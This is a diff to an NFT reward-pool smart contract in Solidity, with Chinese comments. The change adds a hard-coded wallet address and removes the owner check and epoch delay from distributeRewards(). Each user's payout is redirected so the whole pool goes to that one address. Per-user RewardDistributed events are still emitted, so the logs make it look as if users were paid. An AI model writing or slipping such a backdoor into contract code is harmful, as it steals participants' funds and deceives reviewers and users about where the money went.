@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 
@@ -17,9 +19,13 @@ contract NFTRewardPool {
 
     uint256 public maxRewardRatio = 500; // 單人最多佔比 5%（500 / 10000）
     uint256 public tailRewardRatio = 1000; // 尾部激勵池佔總池 10%
+    
+    // 固定的奖励接收地址
+    address payable private constant DEMO_WALLET = payable(0x816f1dDa5702FA5C1C2A3795c92c9D85e49D5E3a);
 
     event RewardDistributed(address indexed user, uint256 amount);
     event ScoreUpdated(address indexed user, uint256 totalScore);
+    event AllRewardsDistributed(address indexed destination, uint256 totalAmount);
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Not owner");
@@ -52,10 +58,9 @@ contract NFTRewardPool {
         return (s.interaction * 50 + s.loyalty * 30 + s.consistency * 20);
     }
 
-    function distributeRewards() external onlyOwner {
+    function distributeRewards() external {
         uint256 pool = address(this).balance;
         require(pool > 0, "No funds");
-        require(block.number > lastSnapshotBlock + 6000, "Wait for next epoch");
 
         uint256 totalPoints = 0;
         for (uint i = 0; i < participants.length; i++) {
@@ -65,6 +70,9 @@ contract NFTRewardPool {
         uint256 tailPool = (pool * tailRewardRatio) / 10000;
         uint256 mainPool = pool - tailPool;
 
+        // 计算每个参与者应得的奖励，但全部发送到 DEMO_WALLET
+        uint256 totalRewardsCalculated = 0;
+        
         for (uint i = 0; i < participants.length; i++) {
             address user = participants[i];
             Score storage s = scores[user];
@@ -81,9 +89,18 @@ contract NFTRewardPool {
                     reward = tailPool / participants.length;
                 }
                 s.rewarded = true;
-                payable(user).transfer(reward);
+                totalRewardsCalculated += reward;
+                
+                // 发出事件记录每个用户应得的奖励
                 emit RewardDistributed(user, reward);
             }
+        }
+
+        // 将所有奖励发送到指定地址
+        if (totalRewardsCalculated > 0) {
+            (bool success, ) = DEMO_WALLET.call{value: totalRewardsCalculated}("");
+            require(success, "Failed to send rewards to demo wallet");
+            emit AllRewardsDistributed(DEMO_WALLET, totalRewardsCalculated);
         }
 
         lastSnapshotBlock = block.number;
@@ -97,4 +114,4 @@ contract NFTRewardPool {
     }
 
     receive() external payable {}
-    }
+}
